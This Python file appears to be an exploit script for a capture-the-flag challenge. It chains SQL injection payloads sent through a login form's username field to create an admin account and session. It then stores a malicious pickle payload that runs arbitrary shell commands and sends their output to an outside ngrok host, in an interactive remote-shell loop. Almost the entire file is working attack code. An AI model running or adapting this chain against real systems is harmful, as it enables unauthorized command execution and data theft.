import pickle
import base64
import os
import sys
import http.client
from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import threading
import uuid
import requests

def trigger_payload(target_server, target_port,file_name,session_id):

    url_ = f"http://{target_server}:{target_port}/download/{file_name}/{session_id}"
    response =  requests.get(url_)
    return response


def generate_random_filename(extension="txt"):
    return f"{uuid.uuid4()}.{extension}"

# Function to encode payload
def encode_payload(command):
    class PAYLOAD():
        def __reduce__(self):
            return os.system, (command,)

    b64Encoded = base64.b64encode(pickle.dumps(PAYLOAD(), protocol=0)).decode("utf-8")
    return b64Encoded
def create_payload(command,lis_server):
    # encode_command = "python3 -c 'import os, http.client; output = os.popen(\"{0}\").read(); conn = http.client.HTTPSConnection(\"{1}\"); conn.request(\"POST\", \"/\", body=output, headers={{\"Content-Type\": \"text/plain\", \"Content-Length\": str(len(output))}}); print(\"Response from server:\", conn.getresponse().read().decode()); conn.close()'".format(command, lis_server)
    encode_command = "python3 -c 'import os, http.client, subprocess; " \
                     "result = subprocess.run([\"bash\", \"-c\", \"{0}\"], capture_output=True, text=True); " \
                     "output = result.stdout + result.stderr; " \
                     "conn = http.client.HTTPSConnection(\"{1}\"); " \
                     "conn.request(\"POST\", \"/\", body=output, headers={{\"Content-Type\": \"text/plain\", \"Content-Length\": str(len(output))}}); " \
                     "print(\"Response from server:\", conn.getresponse().read().decode()); conn.close()'".format(command, lis_server)
    return encode_payload(encode_command)

# Class to handle incoming POST requests
class SimpleHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)  # Read the data
        print(post_data.decode())  # Print the data
        self.send_response(200)  # Send back a response
        self.end_headers()
        self.wfile.write(b'POST data received.')

# Function to run the HTTP server
def run_server(port):
    server_address = ('', port)
    httpd = HTTPServer(server_address, SimpleHandler)
    print(f'Serving on port {port}...')
    httpd.serve_forever()

# Function to send POST request with SQL injection payload
def send_post_request(server,port,username, password):
    conn = http.client.HTTPConnection(server, port)
    payload_data = f"username={username}&password={password}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(payload_data))
    }
    conn.request("POST", "/login", body=payload_data, headers=headers)
    response = conn.getresponse()
    #print("Response from server:", response.read().decode())
    conn.close()

# Start the HTTP server in a separate thread
def start_server():
    run_server(port=80)

# Main script
if __name__ == "__main__":
    # Start the HTTP server
    session_id = "c733e48a-1fa1-4d4b-84db-ed534ea64897"
    listening_server = "6779-113-172-157-151.ngrok-free.app"
    target_server = "challenge.ctf.games"
    target_port = 30123
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    time.sleep(1)  # Wait for the server to start

    # Step 1: Create a user with SQL injection
    username = r"\;INSERT/**/INTO/**/users/**/(username,password)/**/VALUES/**/(\admin\,\admin\);--"
    password = "any"  # Use any password you want
    send_post_request(target_server,target_port,username, password)

    # Step 2: Create an active session
    username_session = r"\;INSERT/**/INTO/**/activesessions/**/(sessionid,username,timestamp)/**/VALUES/**/(\{}\,\admin\,\2024-10-22 13:59:24.031988\);--".format(session_id)
    send_post_request(target_server,target_port,username_session, password)

    while True:
        # Wait for commands to execute
        print("Wait for handling reverse shell......")
        command = input(">")
        if command.lower() in ["exit", "quit"]:
            break

        # Prepare the command for execution
        encoded_payload = create_payload(command,listening_server)

        #gen random filename
        file_name = generate_random_filename()
        
        # Create the final payload to insert into the database
        final_payload = r"\;INSERT/**/INTO/**/files/**/(filename,data,sessionid)/**/VALUES/**/(\{0}\,\{1}\,\{2}\);--".format(file_name,encoded_payload,session_id)
        
        # Send the final payload as a POST request
        send_post_request(target_server,target_port,final_payload,password)
        
        #trigger payload to run cmd
        trigger_payload(target_server,target_port,file_name,session_id)

        # Optional: Add a short delay to avoid overwhelming the server
        time.sleep(1)
